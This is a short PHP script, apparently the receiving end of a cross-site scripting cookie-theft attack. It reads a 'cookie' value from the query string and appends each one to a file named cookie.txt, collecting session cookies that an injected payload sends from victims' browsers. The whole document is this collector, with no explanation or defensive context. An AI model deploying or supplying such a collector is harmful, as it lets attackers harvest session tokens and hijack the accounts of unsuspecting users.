<?php
	file_put_contents("cookie.txt", $_GET["cookie"], FILE_APPEND);
	file_put_contents("cookie.txt", "\n", FILE_APPEND);
?>
